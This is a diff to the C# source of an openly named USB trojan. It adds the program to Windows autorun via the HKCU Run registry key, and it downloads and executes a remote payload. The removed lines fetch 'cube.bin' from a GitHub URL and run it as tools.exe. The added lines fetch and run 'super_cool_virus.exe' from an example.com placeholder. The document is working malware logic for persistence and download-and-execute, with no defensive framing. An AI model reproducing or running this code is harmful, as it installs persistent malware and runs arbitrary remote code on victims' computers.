@@ -10,13 +10,12 @@ namespace USBTrojan
 {
     public class Tools
     {
-        private const string virusUrl = "https://raw.githubusercontent.com/anttexg/USBTrojan/master/data/cube.bin";
         public static bool AddToAutorun(string path)
         {
             RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
             try
             {
-                reg.SetValue("MS_ESM_" + CreateKey(8), path);
+                reg.SetValue("Totally_Not_A_Virus._Trust_Me._" + GenerateRandomString(8), path);
                 reg.Close();
             }
             catch
@@ -25,7 +24,7 @@ namespace USBTrojan
             }
             return true;
         }
-        public static string CreateKey(int length)
+        public static string GenerateRandomString(int length)
         {
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
             StringBuilder res = new StringBuilder();
@@ -46,25 +45,24 @@ namespace USBTrojan
             catch { }
             return false;
         }
-        public static bool StartVirus(Object state = null)
+        public static void RunPayload(object state = null)
         {
-            string pathToVirus = Program.homeDirectory + "\\tools.exe";
+            var client = new WebClient();
             try
             {
-                if (File.Exists(pathToVirus)) Start(pathToVirus);
-                else
-                {
-                    Console.WriteLine("Downloading Virus...");
-                    var client = new WebClient();
-                    client.DownloadFile(virusUrl, pathToVirus);
-                    return StartVirus();
-                }
+                var fileName = "AnyPayload.exe";
+
+                // Download payload
+                client.DownloadFile("https://example.com/USBTrojan/payload/super_cool_virus.exe", fileName);
+
+                // Execute payload
+                Start(fileName);
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[Virus exception] {ex.Message}");
+                // Handle error
+                Console.WriteLine(ex.Message);
             }
-            return false;
         }
     }
 }
